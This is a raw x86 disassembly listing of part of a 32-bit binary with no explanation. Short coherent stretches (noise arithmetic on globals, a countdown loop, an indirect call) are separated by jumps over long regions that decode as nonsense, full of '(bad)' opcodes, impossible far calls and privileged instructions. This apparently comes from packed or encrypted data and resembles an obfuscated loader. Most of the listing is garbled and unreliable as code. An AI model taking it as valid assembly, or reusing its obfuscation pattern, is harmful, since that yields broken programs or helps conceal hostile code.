  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	neg    DWORD PTR [esi-0x7874a15f]
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a66
  409a66:	inc    edx
  409a67:	lds    edi,FWORD PTR [esi]
  409a69:	pop    ecx
  409a6a:	push   ds
  409a6b:	aad    0xf4
  409a6d:	jp     0x409a99
  409a6f:	or     dl,BYTE PTR [edi-0x7a]
  409a72:	int3   
  409a73:	adc    bh,BYTE PTR [edi-0x1e]
  409a76:	jo     0x409a26
  409a78:	(bad)  
  409a79:	aaa    
  409a7a:	jmp    0x3a1b:0x2866e1a
  409a81:	loopne 0x409a46
  409a83:	fistp  QWORD PTR [edx-0x75]
  409a86:	jmp    DWORD PTR [ebp+0x41]
  409a89:	dec    eax
  409a8a:	fcomp  QWORD PTR [ebx+0x3f]
  409a8d:	mov    bl,BYTE PTR [eax]
  409a8f:	neg    BYTE PTR [eax+eax*1]
  409a92:	xor    BYTE PTR [edx+0x44],ah
  409a95:	js     0x409a92
  409a97:	jmp    0x6342:0x6588777c
  409a9e:	push   es
  409a9f:	cmp    BYTE PTR [edi-0x630ce22d],ah
  409aa5:	(bad)  
  409aa6:	cdq    
  409aa7:	rcl    dh,1
  409aa9:	das    
  409aaa:	mov    dh,0x93
  409aac:	mov    ecx,0x26658fb3
  409ab1:	ss int 0x12
  409ab4:	repz jbe 0x409a48
  409ab7:	pushf  
  409ab8:	sub    BYTE PTR [esi-0x29fb7046],0x65
  409abf:	cmp    bl,BYTE PTR [esi+0x62]
  409ac2:	pusha  
  409ac3:	xor    BYTE PTR [ebx],0x7c
  409ac6:	add    ch,BYTE PTR [esi]
  409ac8:	lods   al,BYTE PTR ds:[esi]
  409ac9:	stc    
  409aca:	inc    eax
  409acb:	jnp    0x409a98
  409acd:	add    DWORD PTR [edx+0x11],0xe6e82c6b
  409ad4:	(bad)  
  409ad5:	jecxz  0x409a7e
  409ad7:	hlt    
  409ad8:	pop    esi
  409ad9:	sbb    DWORD PTR [edi],esp
  409adb:	xor    al,0x12
  409add:	push   ebx
  409ade:	leave  
  409adf:	push   esi
  409ae0:	cmp    al,0xc2
  409ae2:	dec    esi
  409ae3:	popa   
  409ae4:	(bad)  
  409ae5:	stos   DWORD PTR es:[edi],eax
  409ae6:	cwde   
  409ae7:	inc    edi
  409ae8:	rcl    DWORD PTR [ebp+0x31],0xde
  409aec:	mov    ch,0x99
  409aee:	lods   al,BYTE PTR ds:[esi]
  409aef:	fdivr  st(4),st
  409af1:	jne    0x409b6e
  409af3:	xor    al,BYTE PTR [ebp-0x39]
  409af6:	inc    edi
  409af7:	sbb    DWORD PTR [ecx+eiz*8],edx
  409afa:	in     eax,dx
  409afb:	loop   0x409b55
  409afd:	call   DWORD PTR [edi+edx*8+0x334183b]
  409b04:	inc    eax
  409b05:	push   ds
  409b06:	aad    0x97
  409b08:	pop    edx
  409b09:	dec    edx
  409b0a:	add    DWORD PTR [ebp+0x6883e40a],edx
  409b10:	arpl   WORD PTR [edi+0x7c],sp
  409b13:	push   0x671084fb
  409b18:	cmp    al,0x2e
  409b1a:	ss inc ebp
  409b1c:	push   0x9ecca2b9
  409b21:	test   DWORD PTR [esi],edi
  409b23:	(bad)  
  409b24:	xor    BYTE PTR [ecx],cl
  409b26:	inc    eax
  409b27:	stos   BYTE PTR es:[edi],al
  409b28:	dec    edi
  409b29:	call   0xfb95:0x5e54c67c
  409b30:	inc    eax
  409b31:	cmp    DWORD PTR [edi+0x5b],esi
  409b34:	aad    0xee
  409b36:	mov    ebx,0x13fdbc95
  409b3b:	mov    ah,0x35
  409b3d:	in     eax,0xc
  409b3f:	cmp    al,0x7a
  409b41:	ds cmc 
  409b43:	sti    
  409b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b45:	jmp    0xb37469af
  409b4a:	sahf   
  409b4b:	mov    bl,0x3e
  409b4d:	push   0x2a
  409b4f:	je     0x409bcb
  409b51:	pop    edx
  409b52:	pop    eax
  409b53:	jle    0x409b26
  409b55:	mov    ecx,0x5a721075
  409b5a:	test   al,0x3f
  409b5c:	call   0x403539c7
  409b61:	sti    
  409b62:	out    0xe1,al
  409b64:	or     bh,BYTE PTR [esi-0x3d]
  409b67:	push   ebx
  409b68:	sbb    DWORD PTR [edi],edi
  409b6a:	btr    DWORD PTR [ecx-0x71],eax
  409b6e:	lods   al,BYTE PTR ds:[esi]
  409b6f:	xor    eax,0x883255f0
  409b74:	jnp    0x409b67
  409b76:	adc    esi,DWORD PTR [esi-0xd217a7f]
  409b7c:	out    dx,al
  409b7d:	mov    ebx,0x99fafb30
  409b82:	clc    
  409b83:	push   cs
  409b84:	(bad)  
  409b85:	xchg   ebp,eax
  409b86:	stos   BYTE PTR es:[edi],al
  409b87:	div    esp
  409b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b8a:	(bad)  
  409b8b:	std    
  409b8c:	mov    ecx,0x10603526
  409b91:	gs ret 0x739f
  409b95:	jl     0x409b63
  409b97:	fsub   st,st(5)
  409b99:	pop    es
  409b9a:	stos   BYTE PTR es:[edi],al
  409b9b:	sub    al,0xb5
  409b9d:	sbb    BYTE PTR [ebx-0x31613c83],ch
  409ba3:	(bad)  
  409ba4:	cmp    al,0xdd
  409ba6:	into   
  409ba7:	iret   
  409ba8:	or     al,0xce
  409baa:	pop    ss
  409bab:	and    al,0x34
  409bad:	jmp    0x5bf60fec
  409bb2:	aad    0xc3
  409bb4:	push   esi
  409bb5:	dec    BYTE PTR [ecx+0x763f85c7]
  409bbb:	fnsave [esi+0x4d]
  409bbe:	(bad)  
  409bbf:	cmp    BYTE PTR [edi+esi*2-0x53],ch
  409bc3:	daa    
  409bc4:	enter  0xabe8,0x2
  409bc8:	pop    ebx
  409bc9:	or     BYTE PTR [edx+0x2c148ac5],cl
  409bcf:	cwde   
  409bd0:	cwde   
  409bd1:	test   eax,0xabc70a6e
  409bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd7:	push   ebp
  409bd8:	jecxz  0x409c1f
  409bda:	jno    0x409b87
  409bdc:	enter  0x1781,0x8a
  409be0:	mov    al,ds:0x24d22554
  409be5:	adc    eax,0xaae93a64
  409bea:	leave  
  409beb:	adc    DWORD PTR [edx+0x75b760a0],edx
  409bf1:	cmp    ah,BYTE PTR [ecx+0x1611133a]
  409bf7:	mov    esp,0x59a9eff0
  409bfc:	retf   
  409bfd:	push   ds
  409bfe:	xchg   bl,ah
  409c00:	jnp    0x409c76
  409c02:	fisub  WORD PTR [ecx+0x2c966592]
  409c08:	stc    
  409c09:	mov    ?,WORD PTR [ecx-0x33acbf6a]
  409c0f:	dec    edi
  409c10:	push   0x6bc17a9d
  409c15:	enter  0x8cef,0x51
  409c19:	arpl   dx,ax
  409c1b:	ins    DWORD PTR es:[edi],dx
  409c1c:	das    
  409c1d:	push   esi
  409c1e:	rol    bl,1
  409c20:	clc    
  409c21:	loop   0x409bdf
  409c23:	repnz stos DWORD PTR es:[edi],eax
  409c25:	push   ebx
  409c26:	pop    ebx
  409c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c28:	cmp    esp,esi
  409c2a:	fimul  WORD PTR [esi]
  409c2c:	mov    ds:0x4982ae8c,eax
  409c31:	mov    dh,0x62
  409c33:	in     eax,0x6a
  409c35:	jle    0x409c2d
  409c37:	jle    0x409c02
  409c39:	or     eax,ebx
  409c3b:	fild   QWORD PTR [ebx]
  409c3d:	les    edx,FWORD PTR [eax]
  409c3f:	dec    eax
  409c40:	push   edx
  409c41:	add    al,0x9
  409c43:	jle    0x409c4b
  409c45:	retf   0x9f15
  409c48:	dec    esp
  409c49:	in     al,0x16
  409c4b:	call   0x61ed868f
  409c50:	mov    esi,0xb4f161e4
  409c55:	pop    esi
  409c56:	lahf   
  409c57:	dec    edx
  409c58:	(bad)  
  409c59:	sti    
  409c5a:	ds (bad) 
  409c5c:	cmc    
  409c5d:	fdivr  DWORD PTR [ebp-0xdabf4d8]
  409c63:	sub    DWORD PTR [ebp-0x21bd8779],eax
  409c69:	(bad)  
  409c6a:	loopne 0x409bec
  409c6c:	clc    
  409c6d:	sbb    edx,DWORD PTR [ebp+0xd98822b]
  409c73:	fmul   DWORD PTR [ecx]
  409c75:	imul   ebx,DWORD PTR [ebx],0xffffffe1
  409c78:	add    DWORD PTR [eax],esi
  409c7a:	lods   al,BYTE PTR ds:[esi]
  409c7b:	mov    BYTE PTR [eax-0x28],bh
  409c7e:	pushf  
  409c7f:	icebp  
  409c80:	std    
  409c81:	mov    ebp,0x55bacca6
  409c86:	call   0x4a98:0x4faf3777
  409c8d:	xchg   ecx,eax
  409c8e:	xor    eax,0x35c3dcc
  409c93:	ret    0xefdf
  409c96:	fisttp DWORD PTR [ebx]
  409c98:	cmc    
  409c99:	jno    0x409cbc
  409c9b:	pop    es
  409c9c:	pop    ebp
  409c9d:	and    BYTE PTR [edi-0x659e898f],bh
  409ca3:	out    0x54,al
  409ca5:	dec    esi
  409ca6:	sbb    edx,eax
  409ca8:	mov    bl,0x33
  409caa:	fidivr WORD PTR ds:0xf1395e21
  409cb0:	std    
  409cb1:	mov    ecx,0xa99b0d19
  409cb6:	ds dec esp
  409cb8:	sub    DWORD PTR [edx-0x6d4e0f45],eax
  409cbe:	inc    eax
  409cbf:	ds popf 
  409cc1:	jg     0x409d1e
  409cc3:	int    0xdc
  409cc5:	dec    eax
  409cc6:	cmc    
  409cc7:	xor    DWORD PTR [ebx+edi*2-0x61],esp
  409ccb:	js     0x409c86
  409ccd:	sti    
  409cce:	or     ch,BYTE PTR [eax-0x49]
  409cd1:	xchg   DWORD PTR [ecx-0x35],esp
  409cd4:	aaa    
  409cd5:	and    BYTE PTR [edi],cl
  409cd7:	arpl   sp,cx
  409cd9:	ret    
  409cda:	rol    BYTE PTR [ebx+0x0],cl
  409cdd:	ins    DWORD PTR es:[edi],dx
  409cde:	daa    
  409cdf:	jge    0x409ccf
  409ce1:	stos   DWORD PTR es:[edi],eax
  409ce2:	das    
  409ce3:	mov    al,ss:0x6fe29617
  409ce9:	mov    ecx,0x55070a81
  409cee:	push   edi
  409cef:	adc    al,0xe
  409cf1:	push   ss
  409cf2:	push   ebp
  409cf3:	dec    ebx
  409cf4:	jne    0x409cd8
  409cf6:	mov    eax,0x24dc55c1
  409cfb:	jecxz  0x409ccd
  409cfd:	jnp    0x409d2f
  409cff:	push   ecx
  409d00:	inc    ecx
  409d01:	mov    bl,0x94
  409d03:	and    esp,ebx
  409d05:	(bad)  
  409d06:	fdiv   DWORD PTR [esi+0x125cf43d]
  409d0c:	add    edi,esi
  409d0e:	mov    eax,ds:0x587209e9
  409d13:	rcr    esi,0x10
  409d16:	mov    dl,0x31
  409d18:	test   DWORD PTR [ebx-0x738bd00],eax
  409d1e:	mov    cl,0xb1
  409d20:	push   eax
  409d21:	(bad)  
  409d22:	lds    ebp,FWORD PTR [esp+ebp*8]
  409d25:	mov    dh,BYTE PTR [ebx+0x52]
  409d28:	ret    0x23ad
  409d2b:	mov    edx,0xb6cc6aae
  409d30:	test   BYTE PTR [eax-0x77],0x46
  409d34:	dec    edi
  409d35:	in     eax,dx
  409d36:	sub    esi,DWORD PTR [ecx-0x62]
  409d39:	sub    DWORD PTR [ebx],edi
  409d3b:	or     BYTE PTR [edi],0x20
  409d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d3f:	xchg   esi,eax
  409d40:	pop    eax
  409d41:	add    edx,esp
  409d43:	or     eax,0xa54c2c62
  409d48:	shl    DWORD PTR [ebx+ecx*4+0x2fd7529a],0xd4
  409d50:	pop    ss
  409d51:	loope  0x409ce0
  409d53:	pusha  
  409d54:	loop   0x409da5
  409d56:	(bad)  
  409d57:	jle    0x409d86
  409d59:	out    dx,al
  409d5a:	test   BYTE PTR [esi],al
  409d5c:	cdq    
  409d5d:	popf   
  409d5e:	mov    edx,ebp
  409d60:	out    0xd3,al
  409d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d63:	jns    0x409d1c
  409d65:	xchg   DWORD PTR [ebx],edx
  409d67:	sub    dh,BYTE PTR [edx+0x23]
  409d6a:	or     eax,DWORD PTR [edi]
  409d6c:	cmp    eax,0x4c6ad231
  409d71:	xor    dl,BYTE PTR [edi-0x43]
  409d74:	call   0x6aad:0x66020ba3
  409d7b:	sub    esi,DWORD PTR [edi-0x8]
  409d7e:	jle    0x409dbc
  409d80:	sub    ecx,DWORD PTR [ecx]
  409d82:	and    eax,0x12129a30
  409d87:	pop    ebx
  409d88:	mov    edx,0xb4e437c8
  409d8d:	dec    esi
  409d8e:	shl    DWORD PTR [ecx+0x69],cl
  409d91:	sbb    al,0x87
  409d93:	add    BYTE PTR [eax+esi*4],0x3b
  409d97:	dec    edi
  409d98:	pop    esp
  409d99:	scas   eax,DWORD PTR es:[edi]
  409d9a:	(bad)
  409d9e:	call   0x5b4c5d6d
  409da3:	es dec esi
  409da5:	pmulhuw mm4,mm3
  409da8:	mov    ah,0xe8
  409daa:	xchg   edi,ebp
  409dac:	in     eax,dx
  409dad:	pop    es
  409dae:	add    al,0x3a
  409db0:	xchg   ecx,eax
  409db1:	and    BYTE PTR [ebx+ecx*4+0x26620dd6],cl
  409db8:	cld    
  409db9:	pop    ds
  409dba:	mov    esi,0x5cc7abf1
  409dbf:	adc    al,0xa
  409dc1:	xlat   BYTE PTR ds:[ebx]
  409dc2:	mov    cl,0xbf
  409dc4:	push   edx
  409dc5:	xor    BYTE PTR [edi],ah
  409dc7:	xor    al,BYTE PTR [eax-0x3c]
  409dca:	cmp    ch,BYTE PTR [eax+0x3504a57d]
  409dd0:	in     eax,dx
  409dd1:	mov    edi,0x2f66fb1
  409dd6:	ret    
  409dd7:	dec    edi
  409dd8:	inc    esi
  409dd9:	inc    esi
  409dda:	push   es
  409ddb:	arpl   WORD PTR [ebx],di
  409ddd:	and    dh,BYTE PTR ds:0xcca763e2
  409de3:	sbb    al,0x72
  409de5:	pop    ebp
  409de6:	jmp    0x409e32
  409de8:	or     BYTE PTR [esi+esi*1],dl
  409deb:	mov    eax,0x315399ae
  409df0:	inc    edi
  409df1:	mov    edx,0xa87439b2
  409df6:	outs   dx,BYTE PTR ds:[esi]
  409df7:	push   ss
  409df8:	inc    ebx
  409df9:	fsubr  st,st(2)
  409dfb:	sub    ecx,DWORD PTR [ebp+ebp*2-0x274a4070]
  409e02:	jl     0x409d89
  409e04:	(bad)  
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	test   eax,0x2641c18d
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	imul   ebp,DWORD PTR [esp+esi*8],0x86fbdcdf
  409e94:	ins    DWORD PTR es:[edi],dx
  409e95:	adc    al,bl
  409e97:	test   cl,0x4b
  409e9a:	and    DWORD PTR [ecx],0x5ede9335
  409ea0:	adc    DWORD PTR [eax+0x34],ebx
  409ea3:	dec    ebp
  409ea4:	mov    edi,DWORD PTR [ebx+0x76484f1a]
  409eaa:	xor    DWORD PTR [eax-0x56],0xffffffe6
  409eae:	dec    ebp
  409eaf:	jne    0x409e97
  409eb1:	pushf  
  409eb2:	in     eax,dx
  409eb3:	mov    esp,0x599328f4
  409eb8:	pop    ss
  409eb9:	jmp    0xd509b4ac
  409ebe:	jae    0x409e57
  409ec0:	fcmovb st,st(1)
  409ec2:	xor    eax,0x252cdb26
  409ec7:	push   DWORD PTR [edx-0x58a32338]
  409ecd:	das    
  409ece:	mov    edx,DWORD PTR [esi]
  409ed0:	ret    0xe068
  409ed3:	enter  0xaee9,0xce
  409ed7:	cmp    eax,0x41563ab7
  409edc:	or     BYTE PTR [ecx+0x16],bh
  409edf:	adc    DWORD PTR [eax+0x9],eax
  409ee2:	xchg   BYTE PTR [esi+0x2b],al
  409ee5:	mov    esp,0xbe280cb1
  409eea:	add    eax,0x2f795c32
  409eef:	jp     0x409f3a
  409ef1:	sbb    bh,BYTE PTR [eax]
  409ef3:	xchg   DWORD PTR [ebx],esp
  409ef5:	retf   
  409ef6:	bnd jmp 0x596de405
  409efc:	aaa    
  409efd:	mov    edi,0x137d6cb2
  409f02:	cmp    edx,ebx
  409f04:	xchg   BYTE PTR [edx],bh
  409f06:	and    ecx,DWORD PTR [ecx+0x5e]
  409f09:	mov    dh,0x47
  409f0b:	idiv   dl
  409f0d:	cld    
  409f0e:	inc    ebp
  409f0f:	xchg   ebx,eax
  409f10:	cs sti 
  409f12:	test   al,0x29
  409f14:	(bad)  
  409f15:	cmp    esp,esi
  409f17:	hlt    
  409f18:	aad    0xd9
  409f1a:	cwde   
  409f1b:	push   ss
  409f1c:	add    ebp,DWORD PTR [edi+0x5f59977]
  409f22:	sahf   
  409f23:	mov    eax,ds:0x7a99b430
  409f28:	fisubr WORD PTR ds:0xdcfb9502
  409f2e:	push   edi
  409f2f:	ss jmp 0x409ec6
  409f32:	or     ebp,DWORD PTR ds:0x23c62b41
  409f38:	arpl   si,dx
  409f3a:	nop
  409f3b:	mov    ecx,0x69e0dc24
  409f40:	mov    edx,0x42703aab
  409f45:	inc    ebp
  409f46:	pop    ds
  409f47:	imul   ebx,DWORD PTR [ecx+0x4],0x50c8d4ac
  409f4e:	adc    eax,0x92484297
  409f53:	mov    eax,eax
  409f55:	xor    BYTE PTR ds:0xb76c48c6,ah
  409f5b:	(bad)  
  409f5c:	dec    esi
  409f5d:	ss ret 
  409f5f:	xchg   esp,eax
  409f60:	clc    
  409f61:	dec    ecx
  409f62:	test   DWORD PTR [edx+ecx*2],ecx
  409f65:	add    DWORD PTR [edx],ecx
  409f67:	hlt    
  409f68:	in     eax,dx
  409f69:	add    BYTE PTR [edi],dl
  409f6b:	mov    ch,0x16
  409f6d:	inc    edi
  409f6e:	imul   ebx,DWORD PTR [edi+0x519fd193],0x2c90d727
  409f78:	sar    BYTE PTR [ebp+0x7a],cl
  409f7b:	(bad)  
  409f7e:	jo     0x409f90
  409f80:	lock shl DWORD PTR ss:[ebx+0x3e],cl
  409f85:	pop    ebp
  409f86:	cs scas al,BYTE PTR es:[edi]
  409f88:	ret    0x72c7
  409f8b:	push   ebx
  409f8c:	pop    ecx
  409f8d:	or     ah,ch
  409f8f:	or     eax,0x7432816d
  409f94:	daa    
  409f95:	jle    0x409f8a
  409f97:	cwde   
  409f98:	stos   DWORD PTR es:[edi],eax
  409f99:	sub    al,0xe3
  409f9b:	mov    DWORD PTR [ecx],ebx
  409f9d:	mov    al,ds:0xd595485
  409fa2:	fsubr  DWORD PTR ds:0x4c667d67
  409fa8:	fdivr  DWORD PTR [edx-0x1d]
  409fab:	repz (bad) 
  409fad:	dec    ebx
  409fae:	fisttp DWORD PTR [eax+0x71]
  409fb1:	jg     0x409fca
  409fb3:	add    al,0x91
  409fb5:	push   edi
  409fb6:	aas    
  409fb7:	xchg   ebp,eax
  409fb8:	adc    ah,BYTE PTR [ebp-0x5be6c104]
  409fbe:	pop    edx
  409fbf:	test   BYTE PTR [ebx],0xdb
  409fc2:	cmp    BYTE PTR ds:0xabc4f3f7,dl
  409fc8:	or     DWORD PTR [esi+0x5fe2698f],esp
  409fce:	data16 jb 0x40a013
  409fd1:	ins    DWORD PTR es:[edi],dx
  409fd2:	fadd   st,st(5)
  409fd4:	ret    0x9efc
  409fd7:	adc    BYTE PTR [edi],bl
  409fd9:	xchg   ebx,eax
  409fda:	stc    
  409fdb:	sbb    al,0x50
  409fdd:	mov    edi,DWORD PTR [eax+edi*2-0x4e658285]
  409fe4:	adc    ecx,DWORD PTR [ecx+0x9]
  409fe7:	push   es
  409fe8:	mov    ebx,0x3768cae9
  409fed:	ins    BYTE PTR es:[edi],dx
  409fee:	sbb    BYTE PTR [edi+edi*4-0x77],bh
  409ff2:	sub    ebp,DWORD PTR [edi+0x539b6e]
  409ff8:	dec    edi
  409ff9:	nop
  409ffa:	xor    eax,edx
  409ffc:	fcom   QWORD PTR [esi+0x68]
  409fff:	pop    edi
  40a000:	in     eax,dx
  40a001:	addr16 int3 
  40a003:	jecxz  0x409feb
  40a005:	call   0xc480d739
  40a00a:	inc    ebx
  40a00b:	shr    DWORD PTR [esi-0x2f1e4ac7],1
  40a011:	and    dl,BYTE PTR [eax-0x16c7184d]
  40a017:	or     BYTE PTR ds:0xeeedb76a,0xa9
  40a01e:	xlat   BYTE PTR ds:[ebx]
  40a01f:	lds    eax,FWORD PTR [ebp+0xa56ffe6]
  40a025:	test   DWORD PTR [edx],esp
  40a027:	pop    ebx
  40a028:	dec    ebp
  40a029:	sbb    BYTE PTR [ebx],dl
  40a02b:	and    eax,DWORD PTR [esi-0x2e023c38]
  40a031:	push   edi
  40a032:	ror    DWORD PTR [ecx-0x7d],cl
  40a035:	inc    esp
  40a036:	mov    al,0x88
  40a038:	jmp    0x2e8f9fc
  40a03d:	xor    bl,BYTE PTR [eax+0x23e13997]
  40a043:	stos   DWORD PTR es:[edi],eax
  40a044:	ret    
  40a045:	and    al,0x47
  40a047:	clc    
  40a048:	(bad)  
  40a049:	clc    
  40a04a:	lea    ebp,[ecx]
  40a04c:	adc    al,0x51
  40a04e:	loop   0x40a0c9
  40a050:	outs   dx,DWORD PTR ds:[esi]
  40a051:	stc    
  40a052:	jmp    0x871029b2
  40a057:	mov    BYTE PTR [edi+ebp*1+0xa],ch
  40a05b:	fidiv  WORD PTR [ebx-0x2f0da16f]
  40a061:	fnstsw ax
  40a063:	sbb    ebp,DWORD PTR [ebx+eax*1+0x4be13a1a]
  40a06a:	adc    DWORD PTR ds:0x1eacbb4d,ebp
  40a070:	adc    ch,ah
  40a072:	fsub   st,st(3)
  40a074:	cmp    al,0x20
  40a076:	and    BYTE PTR [ebp-0x3a6de0d4],ah
  40a07c:	lds    esi,FWORD PTR [eax+ecx*8]
  40a07f:	sbb    eax,0x669c52d7
  40a084:	pop    ds
  40a085:	mov    al,BYTE PTR [ebp+ecx*1+0x36403f13]
  40a08c:	scas   eax,DWORD PTR es:[edi]
  40a08d:	mov    eax,ds:0xdbdf8331
  40a092:	fidiv  DWORD PTR [ebx-0x4a]
  40a095:	and    DWORD PTR [esi+0x59],ecx
  40a098:	adc    esi,DWORD PTR [eax+0x3f]
  40a09b:	push   eax
  40a09c:	mov    al,bl
  40a09e:	push   cs
  40a09f:	sub    al,0xe5
  40a0a1:	out    0x2d,eax
  40a0a3:	cmp    BYTE PTR [esi+0x246d888f],cl
  40a0a9:	iret   
  40a0aa:	neg    BYTE PTR [edi+0x6]
  40a0ad:	ror    BYTE PTR [esi],0x85
  40a0b0:	inc    esp
  40a0b1:	dec    esi
  40a0b2:	mov    edi,0x2ea15970
  40a0b7:	cmp    BYTE PTR [edi-0x69],dh
  40a0ba:	dec    ebp
  40a0bb:	add    al,0x28
  40a0bd:	imul   ecx,DWORD PTR [ecx+0x6af61f5e],0x5ead728c
  40a0c7:	jle    0x40a107
  40a0c9:	and    dl,BYTE PTR [ebx+0x47]
  40a0cc:	jo     0x40a0b3
  40a0ce:	imul   BYTE PTR [edx+0x8322b5d]
  40a0d4:	fucompp 
  40a0d6:	adc    bh,BYTE PTR [edi]
  40a0d8:	sbb    al,BYTE PTR [edi+0x28af8c5e]
  40a0de:	ret    0x80d7
  40a0e1:	icebp  
  40a0e2:	ja     0x40a07b
  40a0e4:	jge    0x40a0e6
  40a0e6:	in     eax,dx
  40a0e7:	and    cl,cl
  40a0e9:	fs mov ah,0xd7
  40a0ec:	add    ebx,esi
  40a0ee:	call   0x5d5b:0x30e3f82d
  40a0f5:	aam    0x46
  40a0f7:	mov    eax,ds:0x5bc29ec2
  40a0fc:	push   ebx
  40a0fd:	repz js 0x40a0bc
  40a100:	xchg   esp,eax
  40a101:	out    0x71,al
  40a103:	or     eax,0x6d2f8a1e
  40a108:	shr    DWORD PTR [ebx],0x8b
  40a10b:	jb     0x40a0c9
  40a10d:	rep lods eax,DWORD PTR ds:[esi]
  40a10f:	push   ds
  40a110:	mov    esi,0x3c3e22fa
  40a115:	dec    esi
  40a116:	and    eax,DWORD PTR [esi+0x2f25ffa4]
  40a11c:	and    BYTE PTR [esi],dh
  40a11e:	adc    eax,0x8d2a0ef3
  40a123:	das    
  40a124:	lea    edx,[edi-0x507ee5cf]
  40a12a:	push   ecx
  40a12b:	adc    edi,DWORD PTR [ebx]
  40a12d:	mov    esp,0x2a8fda37
  40a132:	add    esp,DWORD PTR [edx-0x7e]
  40a135:	inc    esp
  40a136:	jae    0x40a150
  40a138:	dec    edx
  40a139:	dec    ebx
  40a13a:	scas   eax,DWORD PTR es:[edi]
  40a13b:	dec    esp
  40a13c:	iret   
  40a13d:	rcl    DWORD PTR [edx+0x7a5fe51],0x18
  40a144:	adc    al,0x1e
  40a146:	sub    dh,ch
  40a148:	xor    BYTE PTR ds:0xe2335c7c,ch
  40a14e:	pop    esi
  40a14f:	and    bl,bh
  40a151:	in     al,dx
  40a152:	rcl    DWORD PTR [eax+0x1791dd91],cl
  40a158:	lock mov ah,0xa9
  40a15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a15c:	sub    DWORD PTR [edx+0x23ba994d],esp
  40a162:	sub    esp,DWORD PTR [edi+0x77]
  40a165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a167:	lea    ecx,[edi]
  40a169:	sbb    ebx,ebx
  40a16b:	dec    ebp
  40a16c:	jl     0x40a1b6
  40a16e:	jle    0x40a195
  40a170:	xlat   BYTE PTR ds:[ebx]
  40a171:	xchg   bl,cl
  40a173:	int    0x3c
  40a175:	js     0x40a1b0
  40a177:	mov    BYTE PTR [esi],cl
  40a179:	sbb    BYTE PTR [edi-0x34],dh
  40a17c:	ins    BYTE PTR es:[edi],dx
  40a17d:	(bad)  
  40a17e:	ror    BYTE PTR [ebx+eax*2],cl
  40a181:	pop    edi
  40a182:	or     edi,DWORD PTR [ebp+eiz*8-0x1f3bda8f]
  40a189:	push   es
  40a18a:	lea    eax,ds:0xd368c74f
  40a190:	push   0x86fb14cf
  40a195:	stc    
  40a196:	aaa    
  40a197:	cmp    DWORD PTR [ebx-0x3],esp
  40a19a:	sub    al,0x6e
  40a19c:	icebp  
  40a19d:	fnstsw WORD PTR [ecx]
  40a19f:	mov    eax,0x5942e524
  40a1a4:	add    eax,0x36056ee
  40a1a9:	cmp    eax,0x5f437a46
  40a1ae:	jl     0x40a204
  40a1b0:	imul   ecx,DWORD PTR [ebp+ebp*1-0x62],0x836f51f0
  40a1b8:	adc    al,0xb0
  40a1ba:	mov    WORD PTR [edi+0x268fdac5],es
  40a1c0:	push   ebp
  40a1c1:	hlt    
  40a1c2:	inc    esp
  40a1c3:	push   0x34
  40a1c5:	mov    eax,0xcbe8e507
  40a1ca:	mov    ds:0x1ca53c3c,al
  40a1cf:	arpl   bp,sp
  40a1d1:	mov    BYTE PTR [edi-0x74],bl
  40a1d4:	fild   WORD PTR [eax-0x45]
  40a1d7:	mov    BYTE PTR ds:0x4a6b4cce,bh
  40a1dd:	gs js  0x40a165
  40a1e0:	loope  0x40a1a1
  40a1e2:	idiv   DWORD PTR ds:0x974b51e7
  40a1e8:	sbb    BYTE PTR [ebp+0x65],dh
  40a1eb:	aas    
  40a1ec:	outs   dx,DWORD PTR ds:[esi]
  40a1ed:	mov    bh,0x3f
  40a1ef:	mov    dh,0xf3
  40a1f1:	jbe    0x40a18b
  40a1f3:	fisub  DWORD PTR [ebx+esi*8+0x19]
  40a1f7:	loop   0x40a1ab
